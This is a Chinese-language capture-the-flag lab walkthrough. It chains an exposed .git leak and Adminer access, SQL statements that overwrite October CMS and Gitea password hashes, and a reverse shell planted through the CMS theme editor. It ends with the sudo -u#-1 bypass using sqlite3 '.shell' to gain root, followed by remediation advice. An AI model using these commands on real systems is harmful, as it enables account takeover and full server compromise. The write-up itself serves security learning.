## 信息收集
知道靶场地址直接对其进行端口扫描
	![](file-20260815095847135.png)
开放了22，80，8585三个端口，进一步探测在其上允许的服务，版本，中间件，操作系统等信息
	![](file-20260815095847137.png)
使用whatweb进一步确定指纹信息防止有遗漏
	![](file-20260815095847139.png)
	![](file-20260815095847140.png)
对网站进行目录扫描
	![](file-20260815095847142.png)
	筛选一下排除404
	![](file-20260815095847145.png)
使用多种工具进行扫描尽可能收集多的信息
	![](file-20260815095847146.png)
	8585端口
	![](file-20260815095847148.png)
- 访问adminer.php这是数据库管理在线后台
	![](file-20260815095847149.png)
- 查看readme.md文件收集一些拓展信息，例如CMS类型
	![](file-20260815095847151.png)
- 访问/backend/backend/signin发现登陆界面，结合路径这可能是CMS的后台管理登陆入口
	![](file-20260815095847167.png)
- 访问8585的frank发现frank的一些介绍，和github有点像应该就是访问了别人的主页，这里收集到了frank用户，网站底部还泄露了版本信息Gitea Version: 1.12.5
	![](file-20260815095847170.png)
## 漏洞发现
信息收集发现Giea，去公开漏洞库搜索寻找发现存在可利用的Exp
	![](file-20260815095847171.png)
## 漏洞利用
在kali中内置此Exp，可直接拿来使用。
	![](file-20260815095847173.png)
	Exp利用有前提：**需要获取一个账户的用户名与密码**

在之前漏洞扫描发现存在大量的.git文件，这其中或许存在有用的，利用GitHack工具拉取源码
	![](file-20260815095847175.png)
	拉取到源码后进行审计，得到数据库连接账号密码：
		october：SQ66EBYx4GT3byXH
前面记得发现了一个数据库在线管理后台可以尝试登陆：
	![](file-20260815095847176.png)
在里面我们可以执行很多操作，例如直接获取数据库的数据：
```sql
SELECT id, login, email, password, is_superuser, is_activated FROM backend_users;
```
-  
	![](file-20260815095847177.png)
	这里的密码是加密过的，所以我们需找出加密算法然后加密我们想要替换的密码：
	修改密码：为admin123的bcrypt 哈希
```sql
UPDATE backend_users 
SET password = '$2a$10$99XjqE2v7rtOtHEgLUhSiOVMafVJIhOcml5mwlC7hdTYdY8xtoAd.' 
WHERE id = 1;
```
- 
	![](file-20260815095847178.png)
这个数据库中存放的是October CMS的用户信息，我们可以利用我们控制的账户frank：admin123尝试登陆，这个frank对应的应该就是之前Giea的frank：
	![](file-20260815095847179.png)

进入http://192.168.1.200/backend/cms/themes编写后门，htm文档不知道这么编写就去查了下官方说明文档。
	![](file-20260815095847181.png)
编写反弹shell：
	![](file-20260815095847182.png)
先监听然后访问反弹shell解码
	![](file-20260815095847183.png)
这里只是个普通权限，联想到之前有一个Gitea，查找了对应的漏洞信息，需要用户凭证，获取凭证什么的都可以去配置文件中查找，一般是ini，conf等，然后可能是备份会有个类似.bak,.back的后缀。这里就查到了app.ini.back。**还可以根据内容去网上搜索，例如这里是Gitea的默认配置文件名会告诉我们是app.ini**，使用find是name参数设置为"app.in*"这样既可以匹配app.ini也可以匹配app.ini.bak，实在没有就"\*pp.in\*"匹配前后包含pp.in。
	![](file-20260815095847185.png)
	获取账号密码：
	gitea:UfFPTF8C8jjxVF2m
	![](file-20260815095847186.png)

使用gitea账号登陆数据库
	![](file-20260815095847187.png)
看看是否可以修改账户的密码接管账户，先查看数据库数据表结构
	![](file-20260815095847190.png)
	![](file-20260815095847205.png)
这里不能只改算法还要改加密方式和盐
```sql
UPDATE user 
SET 
    passwd = '$2a$10$.aFUpEUbVItdD0zLFpEio.UqlnV4/H.8JAkUVpyUnUq6Qai2XzZsy',
    passwd_hash_algo = 'bcrypt',
    salt = NULL
WHERE name = 'frank';
```
- 
	![](file-20260815095847207.png)
	凭证得到了frank：123456
**这里因该是靶场作者偷懒，两个frank是不同的一个是用来登陆CMS管理系统一个是登陆Gitea的**
	![](file-20260815095847208.png)
利用凭证进行登陆：
	![](file-20260815095847210.png)
	![](file-20260815095847213.png)
## 提权
![](file-20260815095847215.png)
![](file-20260815095847216.png)
	![](file-20260815095847217.png)
	提权失败
查看sudo的版本：
	![](file-20260815095847219.png)
查找有关sudo的漏洞：
	![](file-20260815095847220.png)
	这里只需关注第一条和第三条因为用不到Dos。这里拿出第三条
```text
Check for the user sudo permissions
sudo -l 
User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash
So user hacker can't run /bin/bash as root (!root)
User hacker sudo privilege in /etc/sudoers
意思是：用户 hacker 可以在 kali 上以任何用户身份运行 /bin/bash，但不能以 root 身份（因为 !root 的限制）。

# User privilege specification
root    ALL=(ALL:ALL) ALL
hacker ALL=(ALL,!root) /bin/bash
With ALL specified, user hacker can run the binary /bin/bash as any user
配置含义：hacker 可以以任何非 root 用户的身份执行 /bin/bash

EXPLOIT: 
sudo -u#-1 /bin/bash
Example : 
hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#
执行后，hacker 成功获得了 root 权限的 shell。

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id
and /bin/bash is executed with root permission
漏洞描述（Description）
sudo 没有检查指定的用户 ID 是否真实存在。
-u#-1 指定用户 ID 为 -1，但在 C 语言的 uid_t 类型转换中，-1 会被解释为 0（即 root 的 ID）。
因此，虽然配置写了 !root 禁止以 root 身份运行，但通过 -u#-1 绕过了这个限制，成功以 root 权限执行了 /bin/bash。
```
同理==上面是/bin/bash配置了(ALL, !root)，这道题是/usr/bin/sqlite3配置了(ALL, !root)，而且sqlite3可以反弹shell **sqlite3 /dev/null '.shell /bin/sh'**==
```
'sudo -u#-1' :指定一个负数UID，利用漏洞将其解析为 UID=0（root权限）。
'sqlite3 /dev/null'：使用 sqlite3 打开一个虚拟数据库（在 /dev/null 中）。
'.shell /bin/bash：利用 SQLite 的 .shell 功能，启动一个 bash，从而得到 root 权限。
```
提取成功
	![](file-20260815095847221.png)

## 攻击原理
**信息泄露 -> 数据库接管 -> 后台代码执行 -> sudo 配置绕过 -> root 权限。**
- 网站暴露 `.git` 和配置备份，泄露了数据库凭据。
- 攻击者通过数据库直接修改 CMS 用户信息，接管后台。
- CMS 后台允许编辑主题文件，因此可以写入服务端代码，获得普通 Shell。
- `sudo` 版本过旧，并错误地允许执行 `sqlite3`。`sqlite3` 可以启动 Shell，旧版 sudo 对特殊 UID 处理错误，导致普通用户绕过 `!root` 限制，获得 root。

**危害:** 攻击者从网站权限提升到整台服务器的 root 权限，可以读取、修改或删除服务器上的代码、数据库、Gitea 仓库和凭据。

**修复:**
- 删除公网可访问的 `.git`、备份文件和 Adminer.php，立即轮换所有已泄露凭据，将不该暴露在公网的全面切换为内网环境。
- 升级 sudo 和 Gitea，删除 `sqlite3` 等可启动 Shell 程序的 sudo 权限。
- 由于已经拿到 root，不能只打补丁，应该检查后门并从可信镜像重建服务器。